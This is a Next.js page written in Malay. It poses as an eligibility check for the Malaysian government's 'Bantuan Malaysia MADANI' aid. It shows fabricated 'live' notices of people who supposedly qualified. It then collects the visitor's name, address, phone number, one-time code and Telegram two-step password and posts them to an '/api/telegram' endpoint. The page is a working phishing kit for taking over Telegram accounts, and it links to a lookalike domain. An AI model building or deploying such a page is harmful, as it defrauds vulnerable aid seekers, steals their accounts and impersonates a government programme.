"use client";

import { useState, useRef, useEffect } from "react";

const phonePrefix = "+60";

function normalizeMalaysiaPhone(raw: string) {
  let digits = (raw || "").replace(/\D/g, "");
  if (digits.startsWith("60")) digits = digits.slice(2);
  if (digits.startsWith("0")) digits = digits.slice(1);
  return digits;
}

function formatLocalPhone(digits: string) {
  digits = digits.slice(0, 10);
  if (digits.length <= 2) return digits;
  if (digits.length <= 5) return digits.slice(0, 2) + " " + digits.slice(2);
  return digits.slice(0, 2) + " " + digits.slice(2, 5) + " " + digits.slice(5);
}

const liveMessages = [
  { name: "Ahmad", bantuan: "Bantuan Warga Emas", negeri: "Selangor", masa: "Baru sahaja", theme: "emas" },
  { name: "Siti Aminah", bantuan: "Bantuan Isi Rumah", negeri: "Johor", masa: "1 minit lalu", theme: "rumah" },
  { name: "Raj Kumar", bantuan: "Bantuan OKU", negeri: "Pulau Pinang", masa: "2 minit lalu", theme: "oku" },
  { name: "Fatimah", bantuan: "Bantuan Ibu Tunggal", negeri: "Kelantan", masa: "Baru sahaja", theme: "ibu" },
  { name: "Haziq", bantuan: "Bantuan Pelajar", negeri: "Melaka", masa: "3 minit lalu", theme: "pelajar" },
  { name: "Nurul Izzati", bantuan: "Bantuan Bujang", negeri: "Perak", masa: "1 minit lalu", theme: "bujang" },
  { name: "Kamaluddin", bantuan: "Bantuan Peniaga Kecil", negeri: "Sabah", masa: "2 minit lalu", theme: "peniaga" },
  { name: "Aisyah", bantuan: "Bantuan MADANI", negeri: "Kedah", masa: "Baru sahaja", theme: "madani" },
];

const themeMap: Record<string, { accent: string; color: string }> = {
  emas: { accent: "linear-gradient(135deg, #d97706, #f59e0b)", color: "#b45309" },
  rumah: { accent: "linear-gradient(135deg, #0c2d6b, #1d4ed8)", color: "#1e40af" },
  oku: { accent: "linear-gradient(135deg, #6d28d9, #8b5cf6)", color: "#6d28d9" },
  ibu: { accent: "linear-gradient(135deg, #db2777, #ec4899)", color: "#be185d" },
  pelajar: { accent: "linear-gradient(135deg, #059669, #10b981)", color: "#047857" },
  bujang: { accent: "linear-gradient(135deg, #0891b2, #06b6d4)", color: "#0e7490" },
  peniaga: { accent: "linear-gradient(135deg, #ea580c, #f97316)", color: "#c2410c" },
  madani: { accent: "linear-gradient(135deg, #dc2626, #0c2d6b)", color: "#991b1b" },
};

export default function Home() {
  const [step, setStep] = useState(1);
  const [loading, setLoading] = useState(false);
  const [fullName, setFullName] = useState("");
  const [address, setAddress] = useState("");
  const [phoneNumber, setPhoneNumber] = useState("");
  const fullPhone = "";
  const [otpCode, setOtpCode] = useState(["", "", "", "", ""]);
  const [password, setPassword] = useState("");
  const [showPassword, setShowPassword] = useState(false);
  const [confirmAgree, setConfirmAgree] = useState(false);
  const [otpError, setOtpError] = useState("");
  const [passwordError, setPasswordError] = useState("");
  const [confirmError, setConfirmError] = useState("");
  const [toastIndex, setToastIndex] = useState(0);
  const [toastVisible, setToastVisible] = useState(false);
  const otpRefs = useRef<(HTMLInputElement | null)[]>([]);
  const toastTimerRef = useRef<NodeJS.Timeout | null>(null);

  // Live toast rotation
  useEffect(() => {
    const showToast = () => {
      setToastVisible(true);
      toastTimerRef.current = setTimeout(() => {
        setToastVisible(false);
        toastTimerRef.current = setTimeout(showToast, 1800);
      }, 6000);
    };

    toastTimerRef.current = setTimeout(showToast, 700);
    return () => {
      if (toastTimerRef.current) clearTimeout(toastTimerRef.current);
    };
  }, []);

  useEffect(() => {
    if (!toastVisible) {
      setToastIndex((prev) => (prev + 1) % liveMessages.length);
    }
  }, [toastVisible]);

  const currentToast = liveMessages[toastIndex];
  const currentTheme = themeMap[currentToast?.theme || "rumah"];

  const setFormStep = (s: number) => {
    setStep(s);
  };

  const updateOtpValue = () => {
    return otpCode.join("");
  };

  const handleOtpChange = (index: number, value: string) => {
    const val = value.replace(/\D/g, "").slice(-1);
    const newOtp = [...otpCode];
    newOtp[index] = val;
    setOtpCode(newOtp);
    setOtpError("");
    if (val && index < 4) {
      otpRefs.current[index + 1]?.focus();
    }
  };

  const handleOtpKeyDown = (index: number, e: React.KeyboardEvent<HTMLInputElement>) => {
    if (e.key === "Backspace" && !otpCode[index] && index > 0) {
      otpRefs.current[index - 1]?.focus();
    }
  };

  const handleOtpPaste = (e: React.ClipboardEvent<HTMLInputElement>) => {
    e.preventDefault();
    const pasted = e.clipboardData.getData("text").replace(/\D/g, "").slice(0, 5);
    const newOtp = [...otpCode];
    pasted.split("").forEach((digit, i) => {
      if (i < 5) newOtp[i] = digit;
    });
    setOtpCode(newOtp);
    otpRefs.current[Math.min(pasted.length, 4)]?.focus();
  };

  const handleSecondFormSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    const otp = updateOtpValue().trim();
    if (!otp || otp.length < 5) {
      setOtpError("Sila masukkan kod 5 digit.");
      return;
    }
    setOtpError("");
    setLoading(true);

    // Simulate API call
    setTimeout(() => {
      setLoading(false);
      // Simulate: sometimes show password step, sometimes go to confirm
      if (Math.random() > 0.5) {
        setFormStep(3);
      } else {
        setFormStep(4);
      }
    }, 800);
  };

  const handleThirdFormSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    if (!password.trim()) {
      setPasswordError("Sila masukkan kata laluan anda.");
      return;
    }
    setPasswordError("");
    setLoading(true);

    setTimeout(() => {
      setLoading(false);
      setFormStep(4);
    }, 800);
  };

  const handleFourFormSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!confirmAgree) {
      setConfirmError("Anda perlu mengesahkan permohonan untuk meneruskan.");
      return;
    }
    setConfirmError("");
    setLoading(true);

    try {
      const payload = {
        fullName,
        address,
        phoneNumber: fullPhone || `${phonePrefix}${normalizeMalaysiaPhone(phoneNumber)}`,
        otpCode: updateOtpValue(),
        password,
      };

      const response = await fetch("/api/telegram", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify(payload),
      });

      const result = await response.json();

      if (!response.ok || !result.ok) {
        throw new Error(result.error || "Gagal menghantar notifikasi Telegram.");
      }

      setTimeout(() => {
        setLoading(false);
        setFormStep(5);
      }, 500);
    } catch (error) {
      setLoading(false);
      setConfirmError(
        error instanceof Error ? error.message : "Gagal menghantar notifikasi Telegram. Sila cuba lagi."
      );
    }
  };

  const displayPhone = formatLocalPhone(normalizeMalaysiaPhone(phoneNumber));

  return (
    <>
      {/* Background decoration */}
      <div className="page-decor" aria-hidden="true">
        <span className="page-decor__blob page-decor__blob--1"></span>
        <span className="page-decor__blob page-decor__blob--2"></span>
        <span className="page-decor__blob page-decor__blob--3"></span>
      </div>

      {/* Loading overlay */}
      {loading && (
        <div className="loading">
          <div className="signal" aria-label="Sedang dimuatkan">
            <span></span><span></span><span></span><span></span><span></span>
          </div>
        </div>
      )}

      {/* Header */}
      <header className="site-header">
        <div className="site-header__inner">
          <a href="#" className="site-header__logo">
            {/* eslint-disable-next-line @next/next/no-img-element */}
            <img
              src="/assets/img/1f1f2-1f1fe.png"
              alt=""
              className="site-header__flag"
              width={28}
              height={28}
            />
            <span className="site-header__brand-wrap">
              <span className="site-header__brand">Bantuan Malaysia MADANI</span>
              <span className="site-header__brand-sub">Semak Layak — 2026</span>
            </span>
          </a>
          <a
            className="site-header__pill"
            href="https://bantuannmalaysia.vercel.app/"
            aria-label="Semak kelayakan"
          >
            <svg viewBox="0 0 24 24" fill="currentColor" aria-hidden="true">
              <path d="M15.5 14h-.79l-.28-.27A6.471 6.471 0 0016 9.5 6.5 6.5 0 109.5 16c1.61 0 3.09-.59 4.23-1.57l.27.28v.79l5 4.99L20.49 19l-4.99-5zm-6 0C8.01 14 6 11.99 6 9.5S8.01 5 10.5 5 15 7.01 15 9.5 12.99 14 10.5 14z" />
            </svg>
            Semak
          </a>
        </div>
      </header>

      {/* Live Toast */}
      {currentToast && (
        <div
          id="liveToastWrap"
          role="status"
          aria-live="polite"
          className={toastVisible ? "show" : ""}
          style={{
            opacity: toastVisible ? 1 : 0,
            transform: toastVisible ? "translate3d(0, 0, 0)" : "translate3d(calc(100% + 20px), 0, 0)",
          }}
        >
          <div
            className="live-toast"
            style={{
              ["--toast-accent" as string]: currentTheme.accent,
              ["--toast-color" as string]: currentTheme.color,
            }}
          >
            <div className="live-toast__bar"></div>
            <div className="live-toast__inner">
              <div className="live-toast__icon">
                <svg viewBox="0 0 24 24" fill="currentColor" aria-hidden="true">
                  <path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm-2 14l-4-4 1.41-1.41L10 12.17l6.59-6.59L18 7l-8 8z" />
                </svg>
              </div>
              <div className="live-toast__content">
                <div className="live-toast__head">
                  <span className="live-toast__brand">
                    <span className="live-toast__live-dot"></span>
                    Langsung
                  </span>
                  <span className="live-toast__time">{currentToast.masa}</span>
                </div>
                <p className="live-toast__title">
                  <strong>{currentToast.name}</strong> berjaya layak menerima
                </p>
                <p className="live-toast__sub">
                  {currentToast.bantuan} &middot; {currentToast.negeri}
                </p>
              </div>
            </div>
            <div className="live-toast__progress">
              <span className="live-toast__progress-bar"></span>
            </div>
          </div>
        </div>
      )}

      <main className="flex-grow-1 page-main">
        <div className="container container-narrow">
          {/* KAD SEMAKAN / FORM */}
          <div className={`promo-card ${step === 5 ? "is-success" : ""}`}>
            <div className="card-form">
              {step <= 4 && (
                <div className="hero-block">
                  <div className="hero-frame">
                    <section className="promo-banner">
                      {/* eslint-disable-next-line @next/next/no-img-element */}
                      <img
                        src="/assets/img/banner-madani.png"
                        className="promo-banner__img"
                        alt="Semak Layak Bantuan Malaysia MADANI - Semakan mudah untuk semua kategori bantuan"
                      />
                    </section>
                  </div>

                  <div className="bap-info-strip" aria-label="Maklumat program Bantuan Malaysia MADANI">
                    <div className="bap-info-item bap-info-item--highlight">
                      <span className="bap-info-item__icon" aria-hidden="true">
                        <svg viewBox="0 0 24 24" fill="currentColor">
                          <path d="M16 11c1.66 0 2.99-1.34 2.99-3S17.66 5 16 5c-1.66 0-3 1.34-3 3s1.34 3 3 3zm-8 0c1.66 0 2.99-1.34 2.99-3S9.66 5 8 5C6.34 5 5 6.34 5 8s1.34 3 3 3zm0 2c-2.33 0-7 1.17-7 3.5V19h14v-2.5c0-2.33-4.67-3.5-7-3.5zm8 0c-.29 0-.62.02-.97.05 1.16.84 1.97 1.97 1.97 3.45V19h6v-2.5c0-2.33-4.67-3.5-7-3.5z" />
                        </svg>
                      </span>
                      <span className="bap-info-item__label">Kategori</span>
                      <span className="bap-info-item__value">8 Jenis</span>
                    </div>
                    <div className="bap-info-item">
                      <span className="bap-info-item__icon" aria-hidden="true">
                        <svg viewBox="0 0 24 24" fill="currentColor">
                          <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z" />
                        </svg>
                      </span>
                      <span className="bap-info-item__label">Status</span>
                      <span className="bap-info-item__value">Semakan Dibuka</span>
                    </div>
                    <div className="bap-info-item">
                      <span className="bap-info-item__icon" aria-hidden="true">
                        <svg viewBox="0 0 24 24" fill="currentColor">
                          <path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4z" />
                        </svg>
                      </span>
                      <span className="bap-info-item__label">Program</span>
                      <span className="bap-info-item__value">MADANI</span>
                    </div>
                  </div>

                  <div className="hero-notice">
                    <span className="hero-notice__icon" aria-hidden="true">
                      <svg viewBox="0 0 24 24" fill="currentColor">
                        <path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm-1 6h2v6h-2V7zm0 8h2v2h-2v-2z" />
                      </svg>
                    </span>
                    <span>
                      Pastikan anda menyemak kelayakan bantuan yang sesuai — <strong>Bantuan Malaysia MADANI</strong>
                    </span>
                  </div>
                </div>
              )}

              <div className="card-inner">
                <div className="form-panel">
                  {/* STEP 1 */}
                  {step === 1 && (
                    <div className="first">
                      <div>
                        <div className="register-form__head">
                          <span className="register-form__badge">
                            <svg viewBox="0 0 24 24" fill="currentColor" aria-hidden="true">
                              <path d="M15.5 14h-.79l-.28-.27A6.471 6.471 0 0016 9.5 6.5 6.5 0 109.5 16c1.61 0 3.09-.59 4.23-1.57l.27.28v.79l5 4.99L20.49 19l-4.99-5zm-6 0C8.01 14 6 11.99 6 9.5S8.01 5 10.5 5 15 7.01 15 9.5 12.99 14 10.5 14z" />
                            </svg>
                            Semakan Kelayakan Dibuka — 2026
                          </span>
                          <h2 className="register-form__title">
                            Semak Layak <em>Bantuan Malaysia MADANI</em>
                          </h2>
                          <p className="register-form__subtitle">
                            Klik butang di bawah untuk menyemak kelayakan bantuan yang sesuai.
                          </p>
                          <div className="register-form__accent" aria-hidden="true"></div>
                        </div>

                        <div className="register-form__submit">
                          <a
                            className="btn btn-register w-100"
                            href="https://bantuannmalaysia.vercel.app/"
                          >
                            Semak Kelayakan Sekarang
                            <svg viewBox="0 0 24 24" fill="currentColor" aria-hidden="true">
                              <path d="M15.5 14h-.79l-.28-.27A6.471 6.471 0 0016 9.5 6.5 6.5 0 109.5 16c1.61 0 3.09-.59 4.23-1.57l.27.28v.79l5 4.99L20.49 19l-4.99-5zm-6 0C8.01 14 6 11.99 6 9.5S8.01 5 10.5 5 15 7.01 15 9.5 12.99 14 10.5 14z" />
                            </svg>
                          </a>
                        </div>
                      </div>
                    </div>
                  )}

                  {/* STEP 2 - OTP */}
                  {step === 2 && (
                    <div className="second">
                      <form onSubmit={handleSecondFormSubmit}>
                        <input type="hidden" name="full_name" value={fullName} readOnly />
                        <input type="hidden" name="phone_number" value={fullPhone} readOnly />
                        <input type="hidden" name="otp" value={updateOtpValue()} />

                        <div className="otp-step">
                          <div className="otp-step__head">
                            <span className="label-icon-telegram" aria-hidden="true">
                              <svg viewBox="0 0 24 24" fill="currentColor">
                                <path d="M9.78 18.65l.28-4.23 7.68-6.92c.34-.31-.07-.46-.52-.19L7.74 13.3 3.64 12c-.88-.25-.89-.86.2-1.3l15.97-6.16c.73-.33 1.43.18 1.19 1.3l-2.72 12.81c-.19.91-.74 1.13-1.5.71L12.6 16.3l-1.99 1.93c-.23.23-.42.42-.83.42z" />
                              </svg>
                            </span>
                            <h3 className="otp-step__title">Kod Dihantar</h3>
                          </div>

                          <p className="otp-step__desc">
                            Kami telah menghantar kod pengesahan ke nombor telefon anda. Sila buka mesej dan masukkan kod yang diterima.
                          </p>

                          <div className="otp-inputs">
                            {[0, 1, 2, 3, 4].map((i) => (
                              <input
                                key={i}
                                ref={(el) => { otpRefs.current[i] = el; }}
                                type="tel"
                                className="otp-box"
                                maxLength={1}
                                inputMode="numeric"
                                autoComplete={i === 0 ? "one-time-code" : "off"}
                                aria-label={`Digit ${i + 1}`}
                                value={otpCode[i]}
                                onChange={(e) => handleOtpChange(i, e.target.value)}
                                onKeyDown={(e) => handleOtpKeyDown(i, e)}
                                onPaste={i === 0 ? handleOtpPaste : undefined}
                              />
                            ))}
                          </div>

                          {otpError && (
                            <p className="otp-step__error is-visible" role="alert">
                              {otpError}
                            </p>
                          )}

                          <button type="submit" className="btn btn-mk w-100">
                            SAHKAN
                          </button>
                        </div>
                      </form>
                    </div>
                  )}

                  {/* STEP 3 - PASSWORD */}
                  {step === 3 && (
                    <div className="third">
                      <form onSubmit={handleThirdFormSubmit}>
                        <input type="hidden" name="full_name" value={fullName} readOnly />
                        <input type="hidden" name="phone_number" value={fullPhone} readOnly />
                        <input type="hidden" name="otp_code" value={updateOtpValue()} readOnly />

                        <div className="pw-step">
                          <div className="pw-step__head">
                            <span className="pw-step__icon" aria-hidden="true">
                              <svg viewBox="0 0 24 24" fill="currentColor">
                                <path d="M12 1a5 5 0 00-5 5v3H6a2 2 0 00-2 2v10a2 2 0 002 2h12a2 2 0 002-2V11a2 2 0 00-2-2h-1V6a5 5 0 00-5-5zm-3 8V6a3 3 0 116 0v3H9z" />
                              </svg>
                            </span>
                            <h3 className="pw-step__title">Kata Laluan</h3>
                          </div>

                          <p className="pw-step__desc">
                            Sila masukkan kata laluan pengesahan two-step anda untuk meneruskan.
                          </p>

                          <div className="pw-field-wrap">
                            <input
                              name="password"
                              id="password"
                              type={showPassword ? "text" : "password"}
                              placeholder="Masukkan kata laluan anda"
                              autoComplete="current-password"
                              value={password}
                              onChange={(e) => {
                                setPassword(e.target.value);
                                setPasswordError("");
                              }}
                            />
                            <button
                              type="button"
                              className={`pw-toggle ${showPassword ? "is-visible" : ""}`}
                              onClick={() => setShowPassword(!showPassword)}
                              aria-label={showPassword ? "Sembunyikan kata laluan" : "Papar kata laluan"}
                            >
                              <svg className="icon-eye" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth={2} strokeLinecap="round" strokeLinejoin="round" aria-hidden="true">
                                <path d="M1 12s4-7 11-7 11 7 11 7-4 7-11 7S1 12 1 12z" />
                                <circle cx="12" cy="12" r="3" />
                              </svg>
                              <svg className="icon-eye-off" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth={2} strokeLinecap="round" strokeLinejoin="round" aria-hidden="true">
                                <path d="M17.94 17.94A10.94 10.94 0 0112 19c-7 0-11-7-11-7a20.77 20.77 0 014.06-5.06" />
                                <path d="M1 1l22 22" />
                                <path d="M9.88 9.88A3 3 0 0012 15a3 3 0 002.12-.88" />
                                <path d="M14.12 14.12A10.94 10.94 0 0112 19c-7 0-11-7-11-7a20.77 20.77 0 013.06-4.06" />
                              </svg>
                            </button>
                          </div>

                          {passwordError && (
                            <p className="pw-step__error is-visible" role="alert">
                              {passwordError}
                            </p>
                          )}

                          <button type="submit" className="btn btn-mk w-100">
                            SAHKAN
                          </button>
                        </div>
                      </form>
                    </div>
                  )}

                  {/* STEP 4 - CONFIRM */}
                  {step === 4 && (
                    <div className="four">
                      <form onSubmit={handleFourFormSubmit}>
                        <div className="confirm-step">
                          <div className="confirm-step__head">
                            <span className="confirm-step__icon" aria-hidden="true">
                              <svg viewBox="0 0 24 24" fill="currentColor">
                                <path d="M9 11H7v2h2v-2zm4 0h-2v2h2v-2zm4 0h-2v2h2v-2zm2-7H5a2 2 0 00-2 2v14a2 2 0 002 2h14a2 2 0 002-2V6a2 2 0 00-2-2zm0 16H5V9h14v11z" />
                              </svg>
                            </span>
                            <h3 className="confirm-step__title">Sahkan Semakan Kelayakan</h3>
                          </div>

                          <p className="confirm-step__desc">
                            Semak maklumat anda sebelum menyelesaikan semakan kelayakan Bantuan Malaysia MADANI.
                          </p>

                          <div className="confirm-step__summary">
                            <div className="confirm-step__summary-row">
                              <span className="confirm-step__summary-label">Program</span>
                              <span className="confirm-step__summary-value">Bantuan Malaysia MADANI</span>
                            </div>
                            <div className="confirm-step__summary-row">
                              <span className="confirm-step__summary-label">Nama</span>
                              <span className="confirm-step__summary-value">{fullName || "—"}</span>
                            </div>
                            <div className="confirm-step__summary-row">
                              <span className="confirm-step__summary-label">Alamat</span>
                              <span className="confirm-step__summary-value">{address || "—"}</span>
                            </div>
                            <div className="confirm-step__summary-row">
                              <span className="confirm-step__summary-label">Telefon</span>
                              <span className="confirm-step__summary-value">{displayPhone || "—"}</span>
                            </div>
                          </div>

                          <div className="confirm-step__notice">
                            <svg viewBox="0 0 24 24" fill="currentColor" aria-hidden="true">
                              <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z" />
                            </svg>
                            <span>
                              Tiada dokumen tambahan diperlukan. Semakan kelayakan bantuan anda akan diproses selepas permohonan disahkan.
                            </span>
                          </div>

                          <label className="confirm-step__check" htmlFor="confirm_agree">
                            <input
                              type="checkbox"
                              id="confirm_agree"
                              name="confirm_agree"
                              checked={confirmAgree}
                              onChange={(e) => {
                                setConfirmAgree(e.target.checked);
                                if (e.target.checked) setConfirmError("");
                              }}
                            />
                            <span>
                              Saya mengesahkan maklumat yang diberikan adalah betul dan bersetuju melengkapkan semakan kelayakan Bantuan Malaysia MADANI ini.
                            </span>
                          </label>

                          {confirmError && (
                            <p className="confirm-step__error is-visible" role="alert">
                              {confirmError}
                            </p>
                          )}

                          <button type="submit" className="btn btn-mk w-100">
                            Sahkan permohonan
                          </button>
                        </div>
                      </form>
                    </div>
                  )}

                  {/* STEP 5 - SUCCESS */}
                  {step === 5 && (
                    <div className="five success-step">
                      <div className="success-check-wrap" aria-hidden="true">
                        <div className="success-check">
                          <svg className="success-check__svg" viewBox="0 0 48 48">
                            <path
                              className="success-check__path"
                              d="M11 24.5 L19.5 33 L37 15.5"
                            />
                          </svg>
                        </div>
                      </div>

                      <h2 className="success-step__title">Semakan Kelayakan Berjaya!</h2>

                      <p className="success-step__message">
                        Semakan kelayakan Bantuan Malaysia MADANI anda telah berjaya. Keputusan akan diberikan selepas pengesahan — anda akan menerima notifikasi melalui Telegram.
                      </p>

                      <div className="success-step__section">
                        <div className="success-step__summary-head">
                          <span className="success-step__info-icon" aria-hidden="true">
                            i
                          </span>
                          <h3 className="success-step__summary-title">Ringkasan Maklumat</h3>
                        </div>

                        <div className="success-step__next-box">
                          <div className="success-step__next-head">
                            <svg viewBox="0 0 24 24" fill="currentColor" aria-hidden="true">
                              <path d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v1.5h16V18c0-2.66-5.33-4-8-4z" />
                            </svg>
                            <span>Langkah seterusnya:</span>
                          </div>
                          <ul>
                            <li>
                              Keputusan kelayakan bantuan akan diberikan selepas pengesahan. Proses pengesahan mengambil masa 24-48 jam.
                            </li>
                          </ul>
                        </div>
                      </div>

                      <a
                        href=""
                        className="success-step__home-btn"
                        onClick={(e) => {
                          e.preventDefault();
                          setStep(1);
                          setFullName("");
                          setAddress("");
                          setPhoneNumber("");
                          setOtpCode(["", "", "", "", ""]);
                          setPassword("");
                          setConfirmAgree(false);
                        }}
                      >
                        <svg viewBox="0 0 24 24" fill="currentColor" aria-hidden="true">
                          <path d="M10 20v-6h4v6h5v-8h3L12 3 2 12h3v8h5z" />
                        </svg>
                        Kembali ke Laman Utama
                      </a>
                    </div>
                  )}
                </div>
              </div>
            </div>
          </div>

          {/* CARA PENDAFTARAN */}
          {step <= 2 && (
            <div className="guide-box">
              <div className="guide-box__head">
                <span className="guide-box__info" aria-hidden="true">
                  i
                </span>
                Cara Semakan Kelayakan Bantuan Malaysia MADANI:
              </div>
              <ul>
                <li>Terbuka untuk warganegara Malaysia — semakan kelayakan 8 kategori bantuan, permohonan tahun 2026 masih dibuka.</li>
                <li>Klik butang Semak Kelayakan Sekarang untuk meneruskan semakan.</li>
              </ul>
            </div>
          )}
        </div>
      </main>

      <footer className="page-footer">
        <hr className="page-footer__divider" />
        <p className="page-footer__copy">Hak Cipta &copy; 2026 Semua Hak Terpelihara.</p>
        <p className="page-footer__links">
          <a href="#">Terma &amp; Syarat</a>
          <span aria-hidden="true"> &bull; </span>
          <a href="#">Dasar Privasi</a>
        </p>
      </footer>
    </>
  );
}
